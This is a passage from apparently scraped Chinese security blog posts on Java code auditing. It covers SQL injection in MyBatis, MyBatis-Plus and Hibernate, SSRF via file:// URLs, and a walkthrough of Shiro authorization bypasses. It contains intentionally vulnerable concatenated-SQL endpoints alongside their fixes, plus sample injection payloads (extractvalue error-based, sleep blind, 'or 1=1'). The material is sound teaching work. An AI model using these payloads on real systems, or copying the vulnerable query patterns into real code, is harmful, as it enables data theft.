里面的，但是这个里面不是这样的。\n测试一下\n\n\nmybatis 下的 SQL 注入防护：预编译\n这种 SQL 注入的防护 ———— 预编译，其实是这一种方式 #&#123;Parameter&#125;\n\n代码如下\n@GetMapping(\"/mybatis/sec01\")\npublic User mybatisSec01(@RequestParam(\"username\") String username) &#123;\n    return userMapper.findByUserName(username);\n&#125;\n\nMapper 层代码\n//Mybatis \n@Select(\"select * from users where username = #&#123;username&#125;\")\nUser findByUserName(@Param(\"username\") String username);\n\n这样就防住了\nMyBatis易产生SQL注入的三种情况like 关键字的模糊查询在这种情况下使用 #&#123;&#125; 程序会报错，新手程序员就把 #号 改成了 $，这就照样导致了拼接的问题了。\n\n源码如下\n\n&lt;select id=\"findByUserNameVuln02\" parameterType=\"String\" resultMap=\"User\">\n    select * from users where username like '%$&#123;_parameter&#125;%'\n&lt;/select>\n\n\n\n正确写法如下：\n&lt;select id=\"findByUserNamesec\" parameterType=\"String\" resultMap=\"User\">\n    select * from users where username like concat('%',#&#123;_parameter&#125;, '%')\n&lt;/select>\n\n正确写法：\nmysql:\n    select * from users where username like concat('%',#&#123;username&#125;,'%')\noracle:\n    select * from users where username like '%'||#&#123;username&#125;||'%'\nsqlserver:\n    select * from users where username like '%'+#&#123;username&#125;+'%'\n\n使用 in 语句使用in语句时直接使用 #&#123;&#125; 会报错，可能会存在使用 $&#123;&#125; 直接拼接，造成sql注入\n这个项目里面并没有这一模块，所以需要自行添加，XML 和 接口编写如下\n&lt;select id=\"findByUserNameVuln04\" parameterType=\"String\" resultMap=\"User\">\n    select * from users where id in ($&#123;id&#125;)\n&lt;/select>\n\n// http://localhost:8080/sqli/mybatis/vuln04?id=1)%20or%201=1%23\n@GetMapping(\"/mybatis/vuln04\")\npublic List&lt;User> mybatisVuln04(@RequestParam(\"id\") String id) &#123;\n    return userMapper.findByUserNameVuln04(id);\n&#125;\n\n测试成功！\n\n\n这里，当时 RuoYi 的漏洞就是这一种，in 语句使用 $&#123;&#125; 的拼接\n正确用法为使用 foreach，而不是将#替换为$\n这里前面的写法和 Vuln04 差不多，需要我们修改 userMapper.xml 的内容。mybatis 为了防止这种现象的 SQL 注入，\n定义接口：\n@GetMapping(\"/mybatis/sec04\")  \npublic List&lt;User> mybatisSec04(@RequestParam(\"id\") List id)&#123;  \n    return userMapper.findByIdSec04(id);  \n&#125;\n\n写个 Mapper\nList&lt;User> findByIdSec04(@Param(\"id\") List id);\n\n接着是 UserMapper.xml\n&lt;select id=\"findByIdSec04\" parameterType=\"String\" resultMap=\"User\">  \n SELECT  \n * from users WHERE id IN &lt;foreach collection=\"id\" item=\"id\" open=\"(\" close=\")\" separator=\",\">  \n #&#123;id&#125;  \n &lt;/foreach>  \n&lt;/select>\n\n如此便可以成功防护啦！\n\n\n原理上，会把每一个查找的字符都进行分割，我们正确的输入可以是 id&#x3D;1,2,3,4；当然，这里就涉及到其他的逻辑问题了。\n使用 order by 语句和JDBC同理，使用 #&#123;&#125; 方式传参会导致order by语句失效，所以使用order by语句的时候还是需要做好过滤\n在项目里面说的挺明白的，加了个 Filter，我这里就不再赘述了。\n关于 mybatis 中的运行原理https://www.cnblogs.com/cxuanBlog/p/12248536.html；cy 一下，有空再过一遍。\n0x04 Mybatis-Plus 的 SQL 注入探讨\n为了方便各位师傅们学习，我这里自己简单写了一个项目。\n\n本来是可以直接 fork joychou 大师傅的项目的，但是 mybatis 和 mybatis_plus 不太好兼容，所以就自己写一个小项目帮助师傅们理解\nhttps://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/OWASP%20TOP10\n里面的 MybatisPluSqli module 就是对应的项目。\n/mybatis_plus/test 是一个关于 mybatis-plus 的测试接口，若部署成功，访问如图\n\n\n我们后续讲到的这些有问题的方法，都是基于用户可控输入的情况。\n使用 apply 直接拼接 SQL 语句理想的 apply 漏洞场景我们可以先看一种纯拼接的手法，但是讲道理，实际开发里面不可能这么写的。\n@RequestMapping(\"/mybatis_plus/mpVuln02\")  \npublic List&lt;Employee> mpVuln02( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.apply(\"id=\"+id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n首先实际开发中不可能会用 selectList 这个方法，这完全就是自己给自己找坑。\n我拿这个例子出来给师傅们看只是简单说明一下 SQL 注入里面的 apply 漏洞\n\n\n实际情况的 apply 场景代码如下\n@RequestMapping(\"/mybatis_plus/mpVuln01\")  \npublic Employee mpVuln01(String name, String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.eq(\"name\",name).apply(\"id=\"+id);  \n Employee employee = employeeMapper.selectOne(wrapper);  \n return employee;  \n&#125;\n\n这是比较接近实际的情况，首先 apply() 方法算是一个多参请求，我们需要通过 id 与 name 来确定这个数据（虽然实际开发肯定不会告诉你 id）\n这里我们的 payload 要这么打\n?name&#x3D;drunkbaby&amp;id&#x3D;1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e))\n\n是只有报错注入才能打通的，如果我们只是简单的 1&#39; or &#39;1&#39;=&#39;1 这种方式是不可以的。\n因为这个地方\nEmployee employee = employeeMapper.selectOne(wrapper);  \n\n我们的结果是 selectOne()，只是搞出一个，而万能密码是导出所有的数据，明显是会报错的，所以这里只能用报错注入爆数据。\n\n\n虽然表面是 500，但是有时候这种方式是可行的，因为我们看到报错的地方爆出了数据库名，比如在服务器对 500 报错，是打印错误消息的情况下，就可以成功进行 SQL 注入了！\n关于 apply 场景的防护\n用预编译来；我们修对应 /Vuln02 的洞\n\n@RequestMapping(\"/mybatis_plus/mpSec02\")  \npublic List&lt;Employee> mpSec02( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.apply(\"id=&#123;0&#125;\",id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n很简单，要 apply 的地方加上 &#123;0&#125; 即可。\n\n\n防护成功了，对应的 SQL 语句其实是这样的\n\n\nlast 方法产生的 SQL 注入last() 方法经过重写，有两个方法，如下\nlast(String lastSql)\nlast(boolean condition, String lastSql)\n\n也就是说，在 lastSql 里面我们是可以直接写 SQL 语句的，编写一个新的接口\n@RequestMapping(\"/mybatis_plus/mpVuln03\")  \npublic List&lt;Employee> mpVuln03( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.last(\"order by \" + id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n从根本上来说，也是拼接产生的问题\n我们用 payload 打：\n?id&#x3D;1%20or%201&#x3D;1\n\n\n\nexists&#x2F;notExists 拼接产生的SQL 注入exists(String existsSql)\nexists(boolean condition, String existsSql)\n\nnotExists(String notExistsSql)\nnotExists(boolean condition, String notExistsSql)\n\n一共是这四个方法\n原理也比较简单，后续的内容如果没有特别，就不再赘述了\nexists 的接口\n@RequestMapping(\"/mybatis_plus/mpVuln04\")  \npublic List&lt;Employee> mpVuln04( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.exists(\"select * from employees where id = \" + id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\nNotExists 的接口\n@RequestMapping(\"/mybatis_plus/mpVuln05\")  \npublic List&lt;Employee> mpVuln05( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.notExists(\"select * from employees where id = \" + id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\nhaving 语句having(String sqlHaving, Object... params)\nhaving(boolean condition, String sqlHaving, Object... params)\n接口如下\n@RequestMapping(\"/mybatis_plus/mpVuln06\")  \npublic List&lt;Employee> mpVuln06( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().groupBy(\"id\").having(\"id >\" + id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n\norder by 语句\norderBy\n\norderBy(boolean condition, boolean isAsc, R... columns)\n\n\norderByAsc\n\norderByAsc(R... columns)\norderByAsc(boolean condition, R... columns)\n\n\norderByDesc\n\norderByDesc(R... columns)\n\n这和之前说的 mybatis 里面的问题是一样的，因为 order by 的时候不能预编译，所以会出现问题\n三个接口的写法大同小异，如下\npublic List&lt;Employee> orderby01( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().orderBy(true, true, id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n@RequestMapping(\"/mybatis_plus/orderby02\")  \npublic List&lt;Employee> orderby02( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().orderByAsc(id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n@RequestMapping(\"/mybatis_plus/orderby03\")  \npublic List&lt;Employee> orderby03( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().orderByDesc(id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\ngroup BygroupBy(R... columns)\ngroupBy(boolean condition, R... columns)\n\n与 order by 的原理是一样的\n接口如下\n@RequestMapping(\"/mybatis_plus/groupBy\")  \npublic List&lt;Employee> groupBy( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().groupBy(id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\ninSql&#x2F;notInSqlinSql(R column, String inValue)\ninSql(boolean condition, R column, String inValue)\n\nnotInSql(R column, String inValue)\nnotInSql(boolean condition, R column, String inValue)\n\n对应的两个接口\ninSql 的接口\n@RequestMapping(\"/mybatis_plus/insql\")  \npublic List&lt;Employee> inSql( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().inSql(id, \"select * from employees where id >\" + id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\nnotInSql 的接口\n@RequestMapping(\"/mybatis_plus/notinSql\")  \npublic List&lt;Employee> notinSql( String id) &#123;  \n    QueryWrapper&lt;Employee> wrapper = new QueryWrapper&lt;>();  \n wrapper.select().notInSql(id, \"select * from employees where id >\" + id);  \n return employeeMapper.selectList(wrapper);  \n&#125;\n\n关于 Wrapper 自定义 SQL基本和上面的一样，就不再赘述了。\n分页插件的 SQL 注入情况漏洞点比较之前少很多，主要集中于两个地方。\n一个是分页插件自带的 addOrder() 方法，另外一个是之前就有问题的 order by 方法。\n\n配置分页插件\n\npackage com.drunkbaby.config;  \n  \nimport com.baomidou.mybatisplus.annotation.DbType;  \nimport com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;  \nimport com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;  \nimport org.springframework.context.annotation.Bean;  \nimport org.springframework.context.annotation.Configuration;  \n  \n@Configuration  \npublic class MybatisPlusConfig &#123;  \n  \n    /**  \n * 注册插件  \n */  \n @Bean  \n public MybatisPlusInterceptor mybatisPlusInterceptor() &#123;  \n  \n        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();  \n // 添加分页插件  \n PaginationInnerInterceptor pageInterceptor = new PaginationInnerInterceptor();  \n // 设置请求的页面大于最大页后操作，true调回到首页，false继续请求。默认false  \n pageInterceptor.setOverflow(false);  \n // 单页分页条数限制，默认无限制  \n pageInterceptor.setMaxLimit(500L);  \n // 设置数据库类型  \n pageInterceptor.setDbType(DbType.MYSQL);  \n  \n interceptor.addInnerInterceptor(pageInterceptor);  \n return interceptor;  \n &#125;  \n  \n&#125;\n\n这里我新建了一个 Person 相关的 ORM 操作，这样的话我们后续的操作就不会存在干扰，至于 pojo 那些怎么做，我这里就不赘述了。直接看存在漏洞的接口。\naddOrder()@RequestMapping(\"/mybatis_plus/PageVul01\")  \npublic List&lt;Person> mybatisPlusPageVuln01(Long page, Long size, String id)&#123;  \n    QueryWrapper&lt;Person> queryWrapper = new QueryWrapper&lt;>();  \n Page&lt;Person> personPage = new Page&lt;>(1,2);  \n personPage.addOrder(OrderItem.asc(id));  \n IPage&lt;Person> iPage= personMapper.selectPage(personPage, queryWrapper);  \n List&lt;Person> people = iPage.getRecords();  \n return people;  \n&#125;\n\n这里的 Page&lt;Person&gt; personPage = new Page&lt;&gt;(1,2); 的参数由自己定义\n这里对应的 payload 其实，比较有讲究：\n?id&#x3D;1%20and%20extractvalue(1,concat(0x7e,(select%20database()),0x7e)))\n\n&#x2F;&#x2F; 或者是\n?id&#x3D;1&#39; and sleep(5)\n\n必须是通过盲注的形式，如果是普通的注入，是不会有回显的；因为这里分页查找，size 就把你的数据数量限定死了，如果超过这个数据就会报错，所以只能盲注。\n\n\npagehelper这里的原理就和 order by 一样，不赘述了\n因为Order by排序时不能进行预编译处理，所以在使用插件时需要额外注意如下function，同样会存在SQL注入风险：\n\ncom.github.pagehelper.Page\n主要是setOrderBy(java.lang.String)方法\n\n\ncom.github.pagehelper.page.PageMethod\n主要是startPage(int,int,java.lang.String)方法\n\n\ncom.github.pagehelper.PageHelper\n主要是startPage(int,int,java.lang.String)方法\n\n\n\nmybatis Plus SQL 注入的修复\n看了很多资料，基本上没有太好的防御手段，只有写 Filter 比较靠谱，我这里写了一个集成各种 Filter 的，比如 XSS。SQL 注入等漏洞的过滤器。\n\nhttps://github.com/Drun1baby/JavaSecFilters\n0x05 Hibernate 框架下的 SQL 注入Hibernate 是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，使得 Java 程序员可以随心所欲的使用对象编程思维来操纵数据库。\nHibernate 可以使用 hql 来执行 SQL 语句，也可以直接执行 SQL 语句，无论是哪种方式都有可能导致 SQL 注入\nHQLhql 语句就和 PHP 里面的语句非常相似，和 JDBC 的也非常相似，所以这个理解起来比较简单，主要是防护措施。\nString hql = \"from People where username = '\" + username + \"' and password = '\" + password + \"'\";\n\n这种拼接方式存在 SQL 注入\n正确使用以下几种 HQL 参数绑定的方式可以有效避免注入的产生：\n1.命名参数（named parameter）Query&lt;User> query = session.createQuery(\"from users name = ?1\", User.class);\nString parameter = \"g1ts\";\nQuery&lt;User> query = session.createQuery(\"from users name = :name\", User.class);\nquery.setParameter(\"name\", parameter);\n\n2.位置参数（Positional parameter）String parameter = \"g1ts\";\nQuery&lt;User> query = session.createQuery(\"from users name = ?1\", User.class);\nquery.setParameter(1, parameter);\n\n3.命名参数列表（named parameter list）List&lt;String> names = Arrays.asList(\"g1ts\", \"g2ts\");\nQuery&lt;User> query = session.createQuery(\"from users where name in (:names)\", User.class);\nquery.setParameter(\"names\", names);\n\n4.类实例（JavaBean）user1.setName(\"g1ts\");\nQuery&lt;User> query = session.createQuery(\"from users where name =:name\", User.class);\nquery.setProperties(user1);\n\n5.HQL拼接方法这种方式是最常用，而且容易忽视且容易被注入的，通常做法就是对参数的特殊字符进行过滤，推荐大家使用 Spring工具包的StringEscapeUtils.escapeSql()方法对参数进行过滤：\nimport org.apache.commons.lang.StringEscapeUtils;\npublic static void main(String[] args) &#123;\n  String str = StringEscapeUtils.escapeSql(\"'\");\n  System.out.println(str);\n&#125;\n\nSQLHibernate支持使用原生SQL语句执行，所以其风险和JDBC是一致的，直接使用拼接的方法时会导致SQL注入\n语句如下：\nQuery&lt;People> query = session.createNativeQuery(\"select * from user where username = '\" + username + \"' and password = '\" + password + \"'\");\n\n\n正确写法：\nString parameter = \"g1ts\";\nQuery&lt;User> query = session.createNativeQuery(\"select * from user where name = :name\");\nquery.setParameter(\"name\",parameter);\n\n0x06 参考资料https://xz.aliyun.com/t/11672\n","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"Java OWASP 中的其他漏洞代码审计","url":"/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"Java OWASP 中的非 RCE 洞\n\nJava OWASP 中的其他漏洞代码审计0x01 前言本来是想写一些非 RCE 洞的，然后发现 Java 这些东西确实杂，我也不太想开特别多篇文章讲解，就放一起好了。\n0x02 SSRF In Java1. 漏洞分析利用网络请求支持的协议由于Java 没有 php 的 cURL，所以 Java SSRF 支持的协议，不能像 php 使用 curl -V 查看。\nJava 网络请求支持的协议可通过下面几种方法检测：\n\n代码中遍历协议\n官方文档中查看\nimport sun.net.www.protocol 查看\n\n从 import sun.net.www.protocol 可以看到，支持以下协议\n\n\nfile ftp mailto http https jar netdoc\n\n2. 发起网络请求的类当然，SSRF是由发起网络请求的方法造成。所以先整理Java能发起网络请求的类。\n\nHttpClient\nRequest (对HttpClient封装后的类)\nHttpURLConnection\nURLConnection\nURL\nokhttp\n\n如果发起网络请求的类是带 HTTP 开头，那只支持 HTTP、HTTPS 协议。\n比如：\nHttpURLConnection\nHttpClient\nRequest\nokhttp\n\n所以，如果用以下类的方法发起请求，则支持 sun.net.www.protocol 所有协议\nURLConnection\nURL\n\n注意，Request类对 HttpClient 进行了封装。类似 Python 的 requests 库。用法及其简单，一行代码就可以获取网页内容。\nRequest.Get(url).execute().returnContent().toString();\n\n3. 漏洞代码完全无防御的 SSRFpayload 是很简单的，我们主要来看一下运行流程\n打个断点，开始调试\npayload：\n&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln?url&#x3D;file:&#x2F;&#x2F;&#x2F;E:&#x2F;1.txt\n\n\n\n跟进 HttpUtils.URLConnection()\n主要是在这里 ————— getInputStream，把我们输入的 url 进行了请求。\n我们输入的 url 是 file:///E:/1.txt，对应的在解析的时候 url.openConnection() 能够被解析成 FileURLConnection 这个类。所以后续就进行了文件读取的操作\n\n\n如果再往里走就是一些建立连接 connect 的操作了，这里就不细看了，最后的结果如图\n\n\n\n关于利用其他协议攻击也是可以的，这里不再赘述\n\n\n\n文件下载点的 SSRF\n其实是一样的，不过方法从简单的 URL.connection() 变成了 URL.openStream()\n\n不再赘述，这里更符合我们实际的开发场景而已。\nJava DNS Rebinding在 SSRF 攻击里面有一种很特殊的攻击手法，就是 DNS Rebinding，这个手段可以用来绕过黑白名单\n对应的 HackTheBox 上有一道例题\n先了解下Java应用的TTL机制。Java应用的默认TTL为10s，这个默认配置会导致DNS Rebinding绕过失败。也就是说，默认情况下，Java应用不受DNS Rebinding影响。\nJava TTL的值可以通过下面三种方式进行修改：\n\nJVM添加启动参数-Dsun.net.inetaddr.ttl=0\n\n通过代码进行修改\n\n\njava.security.Security.setProperty(\"networkaddress.cache.negative.ttl\" , \"0\");\n\n修改java.security里的networkaddress.cache.negative.ttl变量为0\n\n0x03","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"Java OWASP 中的文件上传代码审计","url":"/2022/09/16/Java-OWASP-%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"Java 文件上传\n\nJava OWASP 中的文件上传代码审计\n这部分的内容估计要放到后面了，因为在 Spring 的业务里面，文件上传漏洞非常非常少。\n\n","categories":["代码审计"],"tags":["Java","代码审计"]},{"title":"Java Shiro 权限绕过多漏洞分析","url":"/2023/03/16/Java-Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"Java Shiro 权限绕过多漏洞分析\n\n0x01 前言之前被面试也有问过这些问题，感觉自己还没有复现过这类漏洞，但因为之前也学过 shiro 的使用，今天就看一下这几个洞。\nShiro 权限绕过漏洞\n\n\nCVE编号\n漏洞说明\n漏洞版本\n\n\n\n\nCVE-2010-3863\n未能对传入的 url 编码进行 decode 解码\nshrio &lt;=1.0.0\n\n\nCVE-2016-6802\nContext Path 路径标准化导致绕过\nshrio &lt;1.3.2\n\n\nCVE-2020-1957\nSpring 与 Shiro 对于 \"/\" 和 \";\" 处理差异导致绕过\nShiro &lt;= 1.5.1\n\n\nCVE-2020-11989\nShiro 二次解码导致的绕过以及 ContextPath 使用 \";\" 的绕过\nshiro &lt; 1.5.3\n\n\nCVE-2020-13933\n由于 Shiro 与 Spring 处理路径时 URL 解码和路径标准化顺序不一致 导致的使用 \"%3b\" 的绕过\nshiro &lt; 1.6.0\n\n\nCVE-2020-17510\n由于 Shiro 与 Spring 处理路径时 URL 解码和路径标准化顺序不一致 导致的使用 \"%2e\" 的绕过\nShiro &lt; 1.7.0\n\n\nCVE-2020-17523\nShiro 匹配鉴权路径时会对分隔的 token 进行 trim 操作 导致的使用 \"%20\" 的绕过\nShiro &lt;1.7.1\n\n\nCVE-2021-41303\nShiro 匹配鉴权路径时会经过多重比较\nShiro =1.7.1\n\n\n\n\n0x02 Shiro 流程分析环境搭建要实现 Shiro 的使用，需要实现三个模块；并且是自上而下实现的\n\n创建 realm 对象，需要自定义类\nDefaultWebSecurityManager\nShiroFilterFactoryBean\n\n关于环境搭建与开发学习可以具体看我这一篇文章，这里不再赘述 http://localhost:4000/2022/07/07/Java%E5%BC%80%E5%8F%91%E4%B9%8Bshiro%E5%AD%A6%E4%B9%A0/\n可以用我已经搭建好的现成环境，需要配置一下 SQL\nhttps://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Shiro/shiro\n其中关键代码在这儿\nShiroConfig.java\n@Configuration  \npublic class ShiroConfig &#123;  \n    // ShiroFilterFactoryBean  \n    @Bean  \n    public ShiroFilterFactoryBean getShiroFilterFactoryBean(  \n            @Qualifier(\"getDefaultWebSecurityManager\") DefaultWebSecurityManager defaultWebSecurityManager)&#123;  \n        ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();  \n        // 设置安全管理器  \n        bean.setSecurityManager(defaultWebSecurityManager);  \n  \n        // 添加 shiro 的内置过滤器  \n        /*  \n        anon：无需认证即可访问  \n        authc：必须认证了才能访问  \n        user：必须拥有 记住我功能才能使用  \n        perms：拥有对某个资源的权限才能访问  \n        role：拥有某个角色权限  \n         */  \n        // 拦截  \n        Map&lt;String, String > filterMap = new LinkedHashMap&lt;>();  \n  \n        filterMap.put(\"/user/add\",\"perms[user:add]\");  \n        filterMap.put(\"/user/update\",\"perms[user:update]\");  \n  \n        filterMap.put(\"/user/*\", \"authc\");  \n        bean.setFilterChainDefinitionMap(filterMap);  \n  \n        bean.setLoginUrl(\"/toLogin\");  \n        bean.setUnauthorizedUrl(\"/noauth\");  \n        return bean;  \n    &#125;  \n  \n    // DefaultWebSecurityManager  \n    @Bean  \n    public DefaultWebSecurityManager getDefaultWebSecurityManager(@Qualifier(\"userRealm\") UserRealm userRealm)&#123;  \n        DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();  \n  \n        // 关联 UserRealm        securityManager.setRealm(userRealm);  \n        return securityManager;  \n    &#125;  \n  \n    // 创建 realm 对象  \n    @Bean  \n    public UserRealm userRealm()&#123;  \n        return new UserRealm();  \n    &#125;  \n&#125;\n\n以及 UserRealm.java\n// 自定义的 Realmpublic class UserRealm extends AuthorizingRealm &#123;  \n  \n    @Autowired  \n    UserService userService;  \n  \n    // 授权  \n    @Override  \n    protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) &#123;  \n        System.out.println(\"执行了=>授权doGetAuthorizationInfo\");  \n  \n        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();  \n  \n        Subject subject = SecurityUtils.getSubject();  \n        User currentUser = (User) subject.getPrincipal();  \n  \n        info.addStringPermission(currentUser.getPerms());  \n        return info;  \n    &#125;  \n  \n    @Override  \n    protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException &#123;  \n        System.out.println(\"执行了=>认证doGetAuthorizationInfo\");  \n  \n        // 数据库中取用户名与密码  \n  \n        UsernamePasswordToken userToken = (UsernamePasswordToken) token;  \n  \n        User user = userService.queryUserByName(userToken.getUsername());  \n  \n        if (user == null)&#123;  \n            return null; // 自动抛出异常  \n        &#125;  \n  \n        // 密码认证，shiro 完成  \n        return new SimpleAuthenticationInfo(user,user.getPwd(),\"\");  \n    &#125;  \n&#125;\n\nShiro 认证流程分析初始化ShiroFilterFactoryBean 类实现了 FactoryBean 接口，那么 Spring 在初始化的时候必然会调用 ShiroFilterFactoryBean.getObject() 方法获取实例\n\n\n在 getObject() 方法中会调用 createInstance() 方法，跟进。\n\n\n先获取到我们配置的 SecurityManager，这个获取是向上获取的，也就是去找 ShiroConfig 这个文件当中的 SecurityManager，在这里是 ShiroConfig#DefaultWebSecurityManager\n接着往下判断 securityManager 是否为 null，以及是否为 WebSecurityManager，如果是的话就抛出异常。如果不是的话，则创建一个 FilterChainManager，这个类的主要功能是链式过滤。我们跟进看一下这个类是怎么被创建出来的，以及其中存储了哪些信息。\n\n\n第一步 new 了一个 DefaultFilterChainManager 类，在它的构造方法中将 filters 和 filterChains 两个成员变量都初始化为一个能保持插入顺序的 LinkedHashMap，之后再调用 addDefaultFilters() 方法添加 Shiro 内置的一些过滤器。\n\n\n往下，将所有的 filters 保存到了 var3 这个迭代器中，再将 var3 丢进循环里面\n\n\napplyGlobalPropertiesIfNecessary() 方法遍历过滤器，并给过滤器添加了很多属性\n\n\n在这个方法中调用了三个方法，三个方法逻辑是一样的，分别是设置 loginUrl、successUrl 和unauthorizedUrl，我们就看第一个 applyLoginUrlIfNecessary，跟进\n\n\n这个方法做的业务是将 loginUrl 赋值给 filter 去，在代码当中的逻辑是这样的；如果我们配置了loginUrl，那么会将 AccessControlFilter 中默认的 loginUrl 替换为我们设置的值，默认的 loginUrl 为 /login.jsp\n后面两个方法道理一样，都是将我们设置的参数替换进去，只不过第三个认证失败跳转 URL 的默认值为 null。\n这里的 this.getLoginUrl();是从我们 shiroFilter Bean 中，setLoginUrl 的值\n\n\n\n回到 org.apache.shiro.spring.web.ShiroFilterFactoryBean#createFilterChainManager 代码中\n\n在迭代器工作结束之后，继续往下看。先获取到自定义的过滤器，将内容保存在 filters 中，filters 变量默认为空，如果我们配置了自定义的过滤器，那么会将其添加到 filters 中。\n\n\n继续往下，通过 getFilterChainDefinitionMap() 方法把自定义过滤器的规则拿出来，并放进迭代器循环。\n\n\n跟进 createChain() 方法，chainName 是我们配置的过滤路径，chainDefinition 是该路径对应的过滤器，通常我们都是一对一的配置，比如：filterMap.put(&quot;/login&quot;, &quot;anon&quot;);，但看到这个方法我们知道了一个过滤路径其实是可以通过传入[&quot;filter1&quot;,&quot;filter2&quot;...]配置多个过滤器的。在这里会根据我们配置的过滤路径和过滤器映射关系一步步配置过滤器执行链。\n\n其实这也就是之前说的，shiro 支持链语句表达式\n\n将 shiro 规则拿出来之后，会进行循环迭代，将原本的规则数据 ———— perms[user:update] 转换为 [&quot;perms&quot;,&quot;user:update&quot;]，再调用 addToChain() 方法将规则添加到对应的  chain 中，跟进 addToChain() 方法\n\n\naddToChain() 方法先从 filters 中根据 filterName 获取对应过滤器，然后调用 ensureChain() 方法，ensureChain() 方法会先从 filterChains 根据 chainName 获取 NamedFilterList，获取不到就创建一个并添加到 filterChains 然后返回。\n\n\n因为过滤路径和过滤器是一对多的关系，所以 ensureChain() 方法返回的 NamedFilterList 其实就是一个有着 name 称属性的 List&lt;Filter&gt;，这个 name 保存的就是过滤路径，List 保存着我们配置的过滤器。获取到 NamedFilterList 后在将过滤器加入其中，这样过滤路径和过滤器映射关系就初始化好了。\n至此，createInstance() 方法中的 createFilterChainManager() 方法才算执行完成，它返回了一个 FilterChainManager 实例。之后再将这个 FilterChainManager 注入 PathMatchingFilterChainResolver 中，它是一个过滤器执行链解析器。\n\n\n回到 createInstance() 方法下，跟进 new PathMatchingFilterChainResolver()，这里需要提前在 getChain() 方法处下一个断点\n\n\n看到形参中 ServletRequest 和 ServletResponse 这两个参数，我们每次请求服务器都会调用这个方法，根据请求的 URL 去匹配过滤器执行链中的过滤路径，匹配上了就返回其对应的过滤器进行过滤。\n这个方法中的 filterChainManager.getChainNames() 返回的是根据我们的配置配置生成的执行链的过滤路径集合，执行链生成的顺序跟我们的配置的顺序相同。从前文中我们也提到，在 DefaultFilterChainManager 的构造方法中将 filterChains 初始化为一个 LinkedHashMap。如果第一个匹配的过滤路径就是 /** 那后面的过滤器永远也匹配不上。\n\n\n过滤实现\n如果之前分析过 Tomcat 的流程，这个过滤实现其实相当好理解\n\nTomcat 在收到请求之后，会进行一系列的 doFilter() 的链式操作，因为这里用到了 shiro 组件，那么 shiro 的某个 Filter 肯定也会被调用进这个 filterChain 当中，OncePerRequestFilter 就是众多 Filter 中的一个。它所实现的 doFilter()方法调用了自身的抽象方法 doFilterInternal()，这个方法在它的子类 AbstractShiroFilter 中被实现了。\n而 OncePerRequestFilter 通过一步步调用，最终调用到了上文提到的 PathMatchingFilterChainResolver.getChain() 方法，这一段流程和 Tomcat 实际上差别不大，我这里仅放出调用栈，不作过多的代码跟进。\ngetChain:98, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)\ngetExecutionChain:415, AbstractShiroFilter (org.apache.shiro.web.servlet)\nexecuteChain:448, AbstractShiroFilter (org.apache.shiro.web.servlet)\ncall:365, AbstractShiroFilter$1 (org.apache.shiro.web.servlet)\ndoCall:90, SubjectCallable (org.apache.shiro.subject.support)\ncall:83, SubjectCallable (org.apache.shiro.subject.support)\nexecute:387, DelegatingSubject (org.apache.shiro.subject.support)\ndoFilterInternal:362, AbstractShiroFilter (org.apache.shiro.web.servlet)\ndoFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)\ninternalDoFilter:189, ApplicationFilterChain (org.apache.catalina.core)\n\n我们去到 OncePerRequestFilter 类的 doFilter() 方法处下个断点，在成功登录并具有 perms:add 权限后，访问。一开始加载的是 SpringShiroFilter 这个类，它是 shiro 与 spring 程序进行整合的默认 